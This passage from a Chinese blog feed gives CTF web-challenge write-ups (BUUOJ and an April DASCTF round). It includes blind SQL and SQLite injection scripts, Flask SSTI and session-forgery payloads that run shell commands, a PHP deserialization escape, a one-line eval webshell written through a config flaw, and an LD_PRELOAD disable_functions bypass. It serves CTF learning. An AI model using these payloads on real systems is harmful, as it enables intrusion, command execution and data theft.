str(val)[:64]</span><br><span class="line">    if str(val).isdigit(): return int(val)</span><br><span class="line">    blacklist &#x3D; [&#39;(&#39;,&#39;)&#39;,&#39;[&#39;,&#39;]&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;] # I don&#39;t like tuple, list and dict.</span><br><span class="line">    if val &#x3D;&#x3D; &#39;&#39; or [c for c in blacklist if c in val] !&#x3D; []:</span><br><span class="line">        print(&#39;&lt;center&gt;Invalid value&lt;&#x2F;center&gt;&#39;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    return val</span><br><span class="line">def get_op(val):</span><br><span class="line">    val &#x3D; str(val)[:2]</span><br><span class="line">    list_ops &#x3D; [&#39;+&#39;,&#39;-&#39;,&#39;&#x2F;&#39;,&#39;*&#39;,&#39;&#x3D;&#39;,&#39;!&#39;]</span><br><span class="line">    if val &#x3D;&#x3D; &#39;&#39; or val[0] not in list_ops:</span><br><span class="line">        print(&#39;&lt;center&gt;Invalid op&lt;&#x2F;center&gt;&#39;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    return val</span><br><span class="line">op &#x3D; get_op(arguments[&#39;op&#39;].value)</span><br><span class="line">value1 &#x3D; get_value(arguments[&#39;value1&#39;].value)</span><br><span class="line">value2 &#x3D; get_value(arguments[&#39;value2&#39;].value)</span><br><span class="line">calc_eval &#x3D; str(repr(value1)) + str(op) + str(repr(value2))</span><br></pre></td></tr></table></figure><p>题目的功能类似于一个计算器。<br>计算结果为value1+op+value2，其中value1和2不能出现<code>&quot;()[]\&#39;</code>，op的第一个字符只能是<code>+-/*=!</code></p><p>repr函数在处理字符串的时候会自己给加上引号</p><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200505063401016.png" alt></p><p>因为op限定开头但没有限定第二个字符，我们可以插入单引号。并且注释后面的单引号进行逃逸</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;test&#39; +&#39;&#39; and source in flag#</span><br><span class="line">value1&#39;    op       value2</span><br></pre></td></tr></table></figure><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200505063613729.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;2cc20ee8-8b8c-491e-81f0-2465837dcc5f.node3.buuoj.cn&#x2F;cgi-bin&#x2F;pycalx.py?value1&#x3D;f&amp;op&#x3D;%2b&#39;&amp;value2&#x3D;+and+True+and+source+in+FLAG%23&amp;source&#x3D;&quot;</span><br><span class="line">s&#x3D;&#39;abcdefghijkmnlopqrstuvwxyz0123456789-&#125;&#39;</span><br><span class="line">flag&#x3D;&#39;flag&#123;&#39;</span><br><span class="line">for a in range(50):</span><br><span class="line">    for i in s:</span><br><span class="line">        r&#x3D;requests.get(url&#x3D;url+flag+i).text</span><br><span class="line">        print(url+flag+i)</span><br><span class="line">        if &#39;False&#39;  not in r:</span><br><span class="line">            print(flag)</span><br><span class="line">            flag+&#x3D;i</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>第一小题的op获取是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">op &#x3D; get_op(arguments[&#39;op&#39;].value)</span><br></pre></td></tr></table></figure><p>第二小题是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">op &#x3D; get_op(get_value(arguments[&#39;op&#39;].value))</span><br></pre></td></tr></table></figure><p>过滤了单引号这里使用<code>F-strings</code>，它支持表达式运算。<br><code>value1</code> = <code>True</code> ，<code>value2</code> =<code>{source*0 if source in FLAG else 233}</code> ，<code>op</code> = <code>+f</code><br>执行的代码为：<br><code>&#39;True&#39;+f&#39;{source*0 if source in FLAG else 233}&#39;</code></p><p><strong>如果匹配成功返回<code>True</code>，匹配失败返回<code>True233</code></strong></p><p>buuoj一直打不出来很迷</p><h3 id="0x-10-watevrCTF-2019-Supercalc"><a href="#0x-10-watevrCTF-2019-Supercalc" class="headerlink" title="0x 10 [watevrCTF-2019]Supercalc"></a>0x 10 [watevrCTF-2019]Supercalc</h3><ul><li><p>考点</p><p>flask session伪造、ssti</p></li><li><p>解题过程</p></li></ul><p>利用<code>1/0#</code>读取flask  session加密所用的key值，由于他的计算代码是存储在session中的，伪造cookie执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3.6 flask_session_cookie_manager3.py encode -s &quot;cded826a1e89925035cc05f0907855f7&quot; -t &quot;&#123;&#39;history&#39;:[&#123;&#39;code&#39;:&#39;__import__(\&quot;os\&quot;).popen(\&quot;ls -a\&quot;).read()&#39;&#125;]&#125;&quot;</span><br><span class="line">发现存在flag.txt文件</span><br><span class="line">python3.6 flask_session_cookie_manager3.py encode -s &quot;cded826a1e89925035cc05f0907855f7&quot; -t &quot;&#123;&#39;history&#39;:[&#123;&#39;code&#39;:&#39;__import__(\&quot;os\&quot;).popen(\&quot;cat flag.txt\&quot;).read()&#39;&#125;]&#125;&quot;</span><br><span class="line">读取flag</span><br></pre></td></tr></table></figure><h3 id="0x-11-BSidesCF-2019-Sequel"><a href="#0x-11-BSidesCF-2019-Sequel" class="headerlink" title="0x 11 [BSidesCF 2019]Sequel"></a>0x 11 [BSidesCF 2019]Sequel</h3><ul><li><p>考点 </p><p>sqlite注入</p></li><li><p>解题过程</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">URL &#x3D; &#39;http:&#x2F;&#x2F;d2303429-2d9f-4353-b4c5-737c9b6b084f.node3.buuoj.cn&#x2F;sequels&#39;</span><br><span class="line">LETTERS &#x3D; string.printable</span><br><span class="line">target &#x3D; &quot;&quot;</span><br><span class="line">while True:</span><br><span class="line">    f &#x3D; False</span><br><span class="line">    for e in LETTERS:</span><br><span class="line">        tmp &#x3D; target + e</span><br><span class="line">        payload &#x3D; r&#39;&#123;&#123;&quot;username&quot;:&quot;\&quot; or CASE WHEN SUBSTR((SELECT name FROM sqlite_master limit 0,1),&#123;&#125;,1)&#x3D;\&quot;&#123;&#125;\&quot; THEN true ELSE false END or \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#39;.format(len(tmp), e)</span><br><span class="line">        # payload &#x3D; r&#39;&#123;&#123;&quot;username&quot;:&quot;\&quot; or CASE WHEN SUBSTR((SELECT username FROM userinfo limit 1,1),&#123;&#125;,1)&#x3D;\&quot;&#123;&#125;\&quot; THEN true ELSE false END or \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#39;.format(len(tmp),e)</span><br><span class="line">        # payload &#x3D; r&#39;&#123;&#123;&quot;username&quot;:&quot;\&quot; or CASE WHEN SUBSTR((SELECT password FROM userinfo limit 1,1),&#123;&#125;,1)&#x3D;\&quot;&#123;&#125;\&quot; THEN true ELSE false END or \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#39;.format(len(tmp),e)</span><br><span class="line">        payload &#x3D; base64.b64encode(payload.encode(&#39;utf-8&#39;)).decode(&quot;utf-8&quot;)</span><br><span class="line">        req &#x3D; requests.Request(&#39;GET&#39;,URL,cookies&#x3D;&#123;&quot;1337_AUTH&quot;: payload&#125;)</span><br><span class="line"></span><br><span class="line">        prepared &#x3D; req.prepare()</span><br><span class="line">        s &#x3D; requests.Session()</span><br><span class="line">        r &#x3D; s.send(prepared, allow_redirects&#x3D;False)</span><br><span class="line">        if &quot;Movie&quot; in r.text:</span><br><span class="line">            target &#x3D; tmp</span><br><span class="line">            print(target)</span><br><span class="line">            f &#x3D; True</span><br><span class="line">            break</span><br><span class="line">    if f: continue</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><p>得到管理员账号和密码登录得到flag</p><h3 id="0x-12-入群题2"><a href="#0x-12-入群题2" class="headerlink" title="0x 12 入群题2"></a>0x 12 入群题2</h3><ul><li><p>考点</p><p>SQL注入、mysql客户端恶意文件读取、php版本特性</p></li><li><p>解题过程</p></li></ul><ol><li>登录框存在SQL注入，利用反斜杠转义，用with group来构造token返回结果为空，最终payload如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;\&amp;password&#x3D;||1 group by token with rollup having token is NULL--+&amp;question&#x3D;1</span><br></pre></td></tr></table></figure><ol start="2"><li>登录进去发现PHP版本5.2.17，在查看数据的这一部分通过网络请求发现可以路径，使用%00截断进行目录遍历，查看根目录重要文件如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">I_am_password_8e7y3262ye9h3sdu2hs9qw</span><br><span class="line">I_am_flag2ijwy2w7892yw2uowh2</span><br></pre></td></tr></table></figure><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428205315835.png" alt></p><ol start="3"><li>同时还发现该系统有数据备份功能，可以使用mysql任意文件读取进行获取flag。</li></ol><p>​         利用脚本：<a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server</a></p><h3 id="0x-13-CSCCTF-2019-Qual-FlaskLight"><a href="#0x-13-CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="0x 13 [CSCCTF 2019 Qual]FlaskLight"></a>0x 13 [CSCCTF 2019 Qual]FlaskLight</h3><ul><li><p>考点</p><p>flask ssti</p></li><li><p>解题过程</p></li></ul><p>利用<code>subprocess.Popen</code>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import html</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">index &#x3D; 0</span><br><span class="line">for i in range(170, 1000):</span><br><span class="line">    try:</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;fd353abb-9623-450c-a960-d91d0ad9c8a3.node3.buuoj.cn&#x2F;?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[&quot; + str(i) + &quot;]&#125;&#125;&quot;</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        res &#x3D; re.findall(&quot;&lt;h2&gt;You searched for:&lt;\&#x2F;h2&gt;\W+&lt;h3&gt;(.*)&lt;\&#x2F;h3&gt;&quot;, r.text)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        # print(res)</span><br><span class="line">        # print(r.text)</span><br><span class="line">        res &#x3D; html.unescape(res[0])</span><br><span class="line">        print(str(i) + &quot; | &quot; + res)</span><br><span class="line">        print(res)</span><br><span class="line">        if &quot;subprocess.Popen&quot; in res:</span><br><span class="line">            index &#x3D; i</span><br><span class="line">            break</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">print(&quot;indexo of subprocess.Popen:&quot; + str(index))</span><br></pre></td></tr></table></figure><p>得到在258位，剩下的如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-PASECA2019-honey-shop&quot;&gt;&lt;a href=&quot;#0x-01-PASECA2019-honey-shop&quot; class=&quot;headerlink&quot; title=&quot;0x 01 [PASECA2019]honey_shop&quot;&gt;&lt;/a&gt;0x 0
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>安恒杯四月月赛题解</title>
    <link href="http://yoursite.com/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/</id>
    <published>2020-04-25T12:58:00.000Z</published>
    <updated>2020-04-30T16:36:16.437Z</updated>
    
    <content type="html"><![CDATA[<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-Ezunserialize"><a href="#0x-01-Ezunserialize" class="headerlink" title="0x 01 Ezunserialize"></a>0x 01 Ezunserialize</h4><ul><li><p>考点</p><p>字符串逃逸</p></li><li><p>解题过程</p></li></ul><ol><li>题目给了源代码，进行审计发现需要构造pop链然后字符逃逸</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line">function write($data) &#123;</span><br><span class="line">    return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read($data) &#123;</span><br><span class="line">    return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    function __construct($a, $b)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $a;</span><br><span class="line">        $this-&gt;password &#x3D; $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $b &#x3D; &#39;gqy&#39;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $c &#x3D; &#39;a&#39;.$this-&gt;b;</span><br><span class="line">        echo $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        &#x2F;&#x2F;flag.php</span><br><span class="line">        echo file_get_contents($this-&gt;c);</span><br><span class="line">        return &#39;nice&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);</span><br><span class="line">&#x2F;&#x2F;省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><br><span class="line">$b &#x3D; unserialize(read(write(serialize($a))));</span><br></pre></td></tr></table></figure><p>首先是构造pop链如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$b &#x3D; new B();</span><br><span class="line">$c &#x3D; new C();</span><br><span class="line">$c-&gt;c &#x3D; &#39;flag.php&#39;;</span><br><span class="line">$b-&gt;b &#x3D; $c;</span><br><span class="line">$x &#x3D; serialize($b);</span><br><span class="line">echo $x;</span><br></pre></td></tr></table></figure><p>得到：<code>O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}</code></p><p>接着是反序列化逃逸对象，本地调试发现当我们传入：<code>a=1&amp;b=1</code>时候得到的pop链是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure><p>当我们注入一个对象时：<code>&quot;;s:0:&quot;&quot;;O:1:&quot;A&quot;:1:{s:1:&quot;a&quot;;s:1:&quot;1&quot;;}}</code>得到的pop链是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:38:&quot;&quot;;s:0:&quot;&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:1:&quot;1&quot;;&#125;&#125;&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure><p>我们需要逃逸出<code>&quot;;s:8:&quot;password&quot;;s:38:&quot;</code>23个字符</p><p>审计代码我们可以发现<code>\0\0\0</code>的长度为6，然后<code>chr(0).&#39;*&#39;.chr(0)</code>的长度为3，因此<code>read()</code>方法可以造成字符逃逸，最终造成对象注入。</p><p>但是这里需要是3的倍数，在payload里面加个1，最终payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b&#x3D;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;;s:0:&quot;</span><br></pre></td></tr></table></figure><p>最后加上空字符串闭合结尾的引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:48:&quot;********&quot;;s:8:&quot;password&quot;;s:86:&quot;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;;s:0:&quot;&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure><p>注入我们pop链对象</p><h3 id="0x-02-babytricks"><a href="#0x-02-babytricks" class="headerlink" title="0x 02 babytricks"></a>0x 02 babytricks</h3><ul><li><p>考点</p><p>SQL注入</p></li><li><p>解题过程</p></li></ul><p>1、题目源代码处得到提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- tips:select * from user where user&#x3D;&#39;$user&#39; and passwd&#x3D;&#39;%s&#39;--&gt;</span><br></pre></td></tr></table></figure><p>2、利用sprintf()格式化字符串漏洞注入账号密码，参考这篇文章：<a href="https://blog.csdn.net/weixin_41185953/article/details/80485075" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/80485075</a></p><p>%1可以吃掉username后面那个单引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql &#x3D; sprintf (&quot;select * from user where user&#x3D;&#39;%1$&#39; and passwd&#x3D;&#39;%s&#39;&quot;,&#39;^0#&#39;);</span><br><span class="line">echo $sql;</span><br><span class="line">&#x2F;&#x2F; select * from user where user&#x3D;&#39;nd passwd&#x3D;&#39;^0#&#39;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200425214441221.png" alt></p><p>使用admin/GoODLUcKcTFer202OHAckFuN登录<a href="http://183.129.189.60:10027/admin/admin.php" target="_blank" rel="noopener">http://183.129.189.60:10027/admin/admin.php</a> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Your sandbox: .&#x2F;shells&#x2F;Ex5xRmjE666uzon5&#x2F; set your shell</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_save_path(&#39;session&#39;);</span><br><span class="line">session_start();</span><br><span class="line">require_once &#39;.&#x2F;init.php&#39;;</span><br><span class="line">if($_SESSION[&#39;login&#39;]!&#x3D;1)&#123;</span><br><span class="line">    die(&quot;&lt;script&gt;window.location.href&#x3D;&#39;.&#x2F;index.php&#39;&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if($_GET[&#39;shell&#39;])&#123;</span><br><span class="line">    $shell&#x3D; addslashes($_GET[&#39;shell&#39;]);</span><br><span class="line">    $file &#x3D; file_get_contents(&#39;.&#x2F;shell.php&#39;);</span><br><span class="line">    $file &#x3D; preg_replace(&quot;&#x2F;\\\$shell &#x3D; &#39;.*&#39;;&#x2F;s&quot;, &quot;\$shell &#x3D; &#39;&#123;$shell&#125;&#39;;&quot;, $file);</span><br><span class="line">    file_put_contents(&#39;.&#x2F;shell.php&#39;, $file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;set your shell&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    chdir(&quot;&#x2F;&quot;);</span><br><span class="line">    highlight_file(dirname(__FILE__).&quot;&#x2F;admin.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>参考<a href="https://www.smi1e.top/小密圈经典写配置漏洞与几种变形学习/" target="_blank" rel="noopener">[小密圈]经典写配置漏洞与几种变形学习</a></p><p>分别访问：</p><ul><li><a href="http://183.129.189.60:10006/admin/admin.php?shell=;eval($_POST[c])" target="_blank" rel="noopener">http://183.129.189.60:10006/admin/admin.php?shell=;eval($_POST[c])</a>;</li><li><a href="http://183.129.189.60:10006/admin/admin.php?shell=$0" target="_blank" rel="noopener">http://183.129.189.60:10006/admin/admin.php?shell=$0</a></li></ul><p>写入shell</p><p>链接蚁剑，发现存在disable_function和openbasedir，php版本是7.4.5，有一个文件查看的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$arr&#x3D;scandir(&quot;..&quot;);</span><br><span class="line">foreach($arr as $value)&#123;</span><br><span class="line">    print_r($value.&quot;\n&quot;);</span><br><span class="line">    $arr2&#x3D;@scandir(&quot;..&#x2F;&quot;.$value);</span><br><span class="line">    if($arr2)&#123;</span><br><span class="line">        if(sizeof($arr2)&gt;3)&#123;</span><br><span class="line">            print_r(scandir(&quot;..&#x2F;&quot;.$value));</span><br><span class="line">            print_r(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据这两篇文章：</p><p><a href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/?nsukey=JBhjc2PnpeklWfY6zzLcMY8ItEKB4kIkTgTcR7TV1YXSmHn5GGocvDWh9nEe9D055d4NIDs1hH%2B8qtxURg0DMvqjoUx6VwoB6RRIWcuekAxsvpmCkLDTxZ%2FUBlC8d5XvuOzqUcKm5V7JVkjYHDeouqLAUZ0TVyw2mUKzj2RLl%2Bg9bWlDE9B5%2FW4IHX2d3ikd1btmOhAqPJk21CfxM0dBFg%3D%3D" target="_blank" rel="noopener">Fuzzer gets us new functions to bypass PHP disable_functions</a></p><p><a href="https://www.anquanke.com/post/id/197745?from=singlemessage" target="_blank" rel="noopener">PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数</a></p><p>结果如下：</p><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429143940031.png" alt></p><p>在phpinfo中存在gnupg这个扩展</p><p><img src="https://img.cjm00n.top/20200425194145.png" alt="img"></p><p>利用  <code>gnupg_init();</code>函数触发即可</p><p>或者是<code>$gpg = new gnupg();</code></p><p>利用脚本：<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p>参考：<a href="https://cjm00n.top/CTF/dasctf-2020-04-wp.html" target="_blank" rel="noopener">https://cjm00n.top/CTF/dasctf-2020-04-wp.html</a></p><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200501003358437.png" alt></p><p>另外能触发<code>ld_preload</code>的函数还有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mb_send_mail</span><br><span class="line">exec</span><br><span class="line">system</span><br><span class="line">passthru</span><br><span class="line">shell_exec</span><br><span class="line">error_log</span><br><span class="line">mail</span><br><span class="line">gnupg_init</span><br><span class="line">imap_mail</span><br><span class="line">pcntl_exec</span><br><span class="line">new gnupg()</span><br></pre></td></tr></table></figure><p>需要根据相应的扩展进行修改</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x-01-6G还远吗？"><a href="#0x-01-6G还远吗？" class="headerlink" title="0x 01 6G还远吗？"></a>0x 01 6G还远吗？</h4><p>断点下载，打开文件得到flag</p><h4 id="0x-02-blueshark"><a href="#0x-02-blueshark" class="headerlink" title="0x 02 blueshark"></a>0x 02 blueshark</h4><p>根据题目提示，过滤obex协议，发现存在一个7z的压缩包。binwalk导出</p><p><img 